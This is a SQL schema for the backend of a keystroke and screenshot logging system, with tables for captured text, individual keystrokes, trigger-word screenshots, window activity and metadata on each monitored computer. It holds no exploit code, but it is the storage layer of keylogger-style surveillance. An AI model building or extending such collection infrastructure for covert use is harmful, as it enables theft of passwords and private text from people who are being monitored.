
-- ============================================================================
-- TABLE: keystroke_sessions
-- Captures grouped keystroke activity by window and time session
-- ============================================================================
CREATE TABLE IF NOT EXISTS keystroke_sessions (
    id BIGSERIAL PRIMARY KEY,
    agent_id TEXT NOT NULL,
    window_title TEXT NOT NULL,
    session_start TIMESTAMP NOT NULL,
    session_end TIMESTAMP NOT NULL,
    captured_text TEXT NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- ============================================================================
-- TABLE: raw_keystrokes
-- Stores individual keystrokes with precise timing (for detailed forensics)
-- ============================================================================
CREATE TABLE IF NOT EXISTS raw_keystrokes (
    id BIGSERIAL PRIMARY KEY,
    agent_id TEXT NOT NULL,
    window_title TEXT,
    keystroke CHAR(1),
    special_key TEXT,  -- For keys like [enter], [backspace], etc.
    timestamp TIMESTAMP NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- ============================================================================
-- TABLE: screenshots
-- Stores screenshot metadata with links to Supabase Storage
-- ============================================================================
CREATE TABLE IF NOT EXISTS screenshots (
    id BIGSERIAL PRIMARY KEY,
    agent_id TEXT NOT NULL,
    window_title TEXT,
    trigger_reason TEXT,  -- 'window_change', 'trigger_word', 'periodic', etc.
    storage_url TEXT NOT NULL,
    file_name TEXT NOT NULL,
    file_size_bytes INTEGER,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- ============================================================================
-- TABLE: window_activity
-- Tracks window switches to build user activity timeline
-- ============================================================================
CREATE TABLE IF NOT EXISTS window_activity (
    id BIGSERIAL PRIMARY KEY,
    agent_id TEXT NOT NULL,
    window_title TEXT NOT NULL,
    focus_start TIMESTAMP NOT NULL,
    focus_end TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- ============================================================================
-- TABLE: agent_metadata
-- Stores information about each agent (computer)
-- ============================================================================
CREATE TABLE IF NOT EXISTS agent_metadata (
    agent_id TEXT PRIMARY KEY,
    hostname TEXT,
    first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    ip_address TEXT,
    user_agent TEXT
);

-- ============================================================================
-- INDEXES for performance
-- ============================================================================

-- Keystroke sessions indexes
CREATE INDEX IF NOT EXISTS idx_sessions_agent ON keystroke_sessions(agent_id);
CREATE INDEX IF NOT EXISTS idx_sessions_window ON keystroke_sessions(window_title);
CREATE INDEX IF NOT EXISTS idx_sessions_start ON keystroke_sessions(session_start);
CREATE INDEX IF NOT EXISTS idx_sessions_created ON keystroke_sessions(created_at);

-- Raw keystrokes indexes
CREATE INDEX IF NOT EXISTS idx_raw_agent ON raw_keystrokes(agent_id);
CREATE INDEX IF NOT EXISTS idx_raw_timestamp ON raw_keystrokes(timestamp);
CREATE INDEX IF NOT EXISTS idx_raw_window ON raw_keystrokes(window_title);

-- Screenshots indexes
CREATE INDEX IF NOT EXISTS idx_screenshots_agent ON screenshots(agent_id);
CREATE INDEX IF NOT EXISTS idx_screenshots_window ON screenshots(window_title);
CREATE INDEX IF NOT EXISTS idx_screenshots_created ON screenshots(created_at);

-- Window activity indexes
CREATE INDEX IF NOT EXISTS idx_window_agent ON window_activity(agent_id);
CREATE INDEX IF NOT EXISTS idx_window_start ON window_activity(focus_start);

-- Agent metadata index
CREATE INDEX IF NOT EXISTS idx_agent_last_seen ON agent_metadata(last_seen);

-- ============================================================================
-- VIEWS for easy querying
-- ============================================================================

-- View: Recent activity across all agents
CREATE OR REPLACE VIEW recent_activity AS
SELECT 
    ks.agent_id,
    ks.window_title,
    ks.session_start,
    ks.captured_text,
    s.storage_url as screenshot_url
FROM keystroke_sessions ks
LEFT JOIN screenshots s 
    ON s.agent_id = ks.agent_id 
    AND s.window_title = ks.window_title
    AND s.created_at BETWEEN ks.session_start AND ks.session_end
ORDER BY ks.session_start DESC
LIMIT 100;

-- View: Agent status dashboard
CREATE OR REPLACE VIEW agent_status AS
SELECT 
    a.agent_id,
    a.hostname,
    a.last_seen,
    COUNT(DISTINCT ks.id) as total_sessions,
    COUNT(DISTINCT s.id) as total_screenshots,
    MAX(ks.session_start) as latest_activity
FROM agent_metadata a
LEFT JOIN keystroke_sessions ks ON ks.agent_id = a.agent_id
LEFT JOIN screenshots s ON s.agent_id = a.agent_id
GROUP BY a.agent_id, a.hostname, a.last_seen;

-- ============================================================================
-- STORAGE BUCKET SETUP
-- ============================================================================
-- NOTE: Run this in Supabase Storage UI or via SQL:
-- 1. Create bucket named 'screenshots'
-- 2. Set it to PUBLIC if you want direct URLs
-- 3. Or keep PRIVATE and use signed URLs for security
